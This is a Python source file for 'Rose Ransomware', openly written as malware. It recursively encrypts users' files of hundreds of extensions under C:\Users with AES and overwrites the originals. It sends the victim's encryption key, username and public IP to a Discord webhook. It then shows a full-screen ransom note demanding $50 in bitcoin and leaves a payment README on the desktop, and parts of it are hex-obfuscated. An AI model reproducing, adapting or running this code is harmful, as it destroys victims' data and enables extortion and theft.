import PyQt5
import PyQt5.QtWidgets
import PyQt5.QtCore
import requests
import random
import string
import threading
from Crypto.Cipher import AES 
from Crypto.Util.Padding import pad
import os
from config import Config

cc = Config()

btc_adress = cc.get_ransomware_money_adr()
email = cc.get_ransomware_email_adr()
webhook_url = cc.get_ransomware_discord_webhook()

fileTypes = ['.txt','.exe','.php','.pl','.7z','.rar','.m4a','.wma','.avi','.wmv','.csv','.d3dbsp','.sc2save','.sie','.sum','.ibank','.t13','.t12','.qdf','.gdb','.tax','.pkpass','.bc6','.bc7','.bkp','.qic','.bkf','.sidn','.sidd','.mddata','.itl','.itdb','.icxs','.hvpl','.hplg','.hkdb','.mdbackup','.syncdb','.gho','.cas','.svg','.map','.wmo','.itm','.sb','.fos','.mcgame','.vdf','.ztmp','.sis','.sid','.ncf','.menu','.layout','.dmp','.blob','.esm','.001','.vtf','.dazip','.fpk','.mlx','.kf','.iwd','.vpk','.tor','.psk','.rim','.w3x','.fsh','.ntl','.arch00','.lvl','.snx','.cfr','.ff','.vpp_pc','.lrf','.m2','.mcmeta','.vfs0','.mpqge','.kdb','.db0','.mp3','.upx','.rofl','.hkx','.bar','.upk','.das','.iwi','.litemod','.asset','.forge','.ltx','.bsa','.apk','.re4','.sav','.lbf','.slm','.bik','.epk','.rgss3a','.pak','.big','.unity3d','.wotreplay','.xxx','.desc','.py','.m3u','.flv','.js','.css','.rb','.png','.jpeg','.p7c','.p7b','.p12','.pfx','.pem','.crt','.cer','.der','.x3f','.srw','.pef','.ptx','.r3d','.rw2','.rwl','.raw','.raf','.orf','.nrw','.mrwref','.mef','.erf','.kdc','.dcr','.cr2','.crw','.bay','.sr2','.srf','.arw','.3fr','.dng','.jpeg','.jpg','.cdr','.indd','.ai','.eps','.pdf','.pdd','.psd','.dbfv','.mdf','.wb2','.rtf','.wpd','.dxg','.xf','.dwg','.pst','.accdb','.mdb','.pptm','.pptx','.ppt','.xlk','.xlsb','.xlsm','.xlsx','.xls','.wps','.docm','.docx','.doc','.odb','.odc','.odm','.odp','.ods','.odt','.sql','.zip','.tar','.tar.gz','.tgz','.biz','.ocx','.html','.htm','.3gp','.srt','.cpp','.mid','.mkv','.mov','.asf','.mpeg','.vob','.mpg','.fla','.swf','.wav','.qcow2','.vdi','.vmdk','.vmx','.gpg','.aes','.ARC','.PAQ','.tar.bz2','.tbk','.bak','.djv','.djvu','.bmp','.cgm','.tif','.tiff','.NEF','.cmd','.class','.jar','.java','.asp','.brd','.sch','.dch','.dip','.vbs','.asm','.pas','.ldf','.ibd','.MYI','.MYD','.frm','.dbf','.SQLITEDB','.SQLITE3','.asc','.lay6','.lay','.ms11(Securitycopy)','.sldm','.sldx','.ppsm','.ppsx','.ppam','.docb','.mml','.sxm','.otg','.slk','.xlw','.xlt','.xlm','.xlc','.dif','.stc','.sxc','.ots','.ods','.hwp','.dotm','.dotx','.docm','.DOT','.max','.xml','.uot','.stw','.sxw','.ott','.csr','.key','wallet.dat']

class Ransomware(PyQt5.QtCore.QRunnable):
	def __init__(self):
		super(Ransomware, self).__init__()
		self.threadpool = PyQt5.QtCore.QThreadPool()
		self.randomId = self.rID(12)
		self.encryptionPass = self.rSeed(32)
		self.filePath = "C:\\Users\\"
		self.ip = ""
		self.userName = ""
		self.crypto = AES.new(self.encryptionPass.encode(), AES.MODE_ECB)

	def readMe(self):
		try:
			f = open(f"C:\\Users\\{self.userName}\\Desktop\\ROSE-RANSOMWARE.md","w+")
			f.write(detailedNote)
		except:
			pass

	def getUserDetails(self):
		try:
			self.ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
			self.userName = os.getlogin()
		except:
			pass
	def encryptFile(self, file):
		try:
			with open(file, 'rb') as infile:
				content = self.crypto.encrypt(pad(infile.read(),32))
				with open(file, "wb") as outfile:
					outfile.write(content)
					outfile.close()
		except:
			pass

	def run(self):
		self.sendMessage()
		for root, directories, files in os.walk(self.filePath):
			for filename in files:
				filepath = os.path.join(root, filename)
				for base in fileTypes:
					if base in filepath:
						threading.Thread(target=self.encryptFile, args=(filepath,)).start()
		
		self.readMe()

	def sendMessage(self):
		try:
			self.getUserDetails()
		except:
			pass
		data = {
			"embeds": [
				{
					"title": "Rose Ransomware - New Victim",
           		    "description": f"```css\nUSERID: {{self.randomId}}```\n```css\nKEY: {{self.encryptionPass}}```\n```css\nUSERNAME: {{self.userName}}```\n```css\nIP: {{self.ip}}```",
         		    "color": int("0x16711680", 16),
         		    "footer": {
				        "text": "\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x20\x7c\x20\x4d\x61\x64\x65\x20\x62\x79\x20\x67\x75\x6d\x62\x6f\x62\x72\x30\x74\x2c\x20\x49\x43\x45\x78\x46\x53\x2c\x20\x73\x75\x65\x67\x64\x75\x20\x61\x6e\x64\x20\x78\x70\x69\x65\x72\x72\x6f\x7a\x20\x7c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72",
            	  	    "icon_url": "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x25\x32\x34\x72\x6f\x73\x65\x2d\x77\x68\x2e\x70\x6e\x67"
					}
				}
  		    ]
		}
		requests.post(webhook_url, json=data)

	def rSeed(self, stringLength):
		password_characters = string.ascii_letters 

		return ''.join(random.choice(password_characters) for i in range(stringLength))

	def rID(self, stringLength):
		password_characters = string.ascii_letters + string.digits
		return ''.join(random.choice(password_characters) for i in range(stringLength))


class Rose(PyQt5.QtWidgets.QMainWindow):
	def __init__(self):
		super().__init__() 
		self.threadpool = PyQt5.QtCore.QThreadPool()
		self.initUI()
		self.banner()
		self.cont()
		self.readMe()	
		self.show()
		self.threadpool.start(Ransomware())

	def initUI(self):
		self.setWindowFlags(PyQt5.QtCore.Qt.WindowCloseButtonHint | PyQt5.QtCore.Qt.WindowType_Mask)
		self.showFullScreen()
		self.banner()
		self.setStyleSheet("""
					QMainWindow{
						background-color: #212121;
						}
					""")	

	def cont(self):
		btn = PyQt5.QtWidgets.QPushButton('Continue', self)
		btn.resize(750,50)
		btn.move((self.frameGeometry().width())/3.35, 900)
		btn.setStyleSheet("""
						QPushButton{
							background-color: #d50000;
							border-radius: 7.5px;
							font-weight: 1200;
							font-size: 18px;
						}
						QPushButton::hover {
							background-color: #9b0000;
						}
						 """)
		btn.show()
		btn.clicked.connect(self.hide)

	def readMe(self):
		rm = PyQt5.QtWidgets.QLabel(ransomNote, self) 
		rm.setStyleSheet("""
							QLabel{
							background-color: #d50000;
							color: #000000;
							border: 2px solid #ff5131;
							border-radius: 7.5px;
							font-weight: 1200;
							font-size: 18px;
							}
						""")
		rm.resize(750,650)
		rm.move(self.frameGeometry().width()/3.35, 220)
		rm.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
		rm.show()

	def banner(self):
		flair = PyQt5.QtWidgets.QLabel('Rose Ransomware', self) 
		flair.setStyleSheet("""
							QLabel{
							background-color: #d50000;
							color: #000000;
							border: 2px solid #ff5131;
							border-radius: 7.5px;
							font-weight: 1400;
							font-size: 45px;
							}
						""")
		flair.resize(800,130)
		flair.move(self.frameGeometry().width()/3.5, 50)
		flair.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
		flair.show()

	@PyQt5.QtCore.pyqtSlot()
	def hide(self):
		self.setWindowOpacity(0)

detailedNote =f"""
-------------------------------------------------------------------------------------------------------------------------
Hello,\n
	If you are reading this then you have likely been hit by Rose Ransomware\n
	We apologize for the incovience, at the end of the day we just want to get paid\n
	In order to receive the decrypter you must follow the following steps to truely recover\n
	all your files.\n
	1. Download BitPay: https://bitpay.com/wallet/ if you are using a different wallet thats fine.\n
	2. Send $50 to this address: {btc_adress}\n
	3. After sending it wait for a confirmation and send us an email and include your UniqueID: {Ransomware().randomId}\n
	4. Wait shortly, you will receive an email with your decrypter once everything is handled.\n
	5. If we do not receive payment within 2 weeks we will no longer be handeling support.
-------------------------------------------------------------------------------------------------------------------------

"""
ransomNote = f"""
All Your Files Have Been Encrypted\n
At the end of the day we just want to get paid\n
Here are the instructions to get getting your files back\n
1. Pay $50 btc to the listed address\n
2. Send an email and include your unique id\n
3. Wait\n
------------------------------------\n
Check your desktop for ROSE-RANSOMWARE.md if you are lost!\n
------------------------------------\n
BTC Address: {btc_adress}\n
Email: {email}\n
UniqueID: {Ransomware().randomId}\n
------------------------------------\n
Click the Button Below To Continue:
(Killing this program will result in a full lose of files)\n
"""
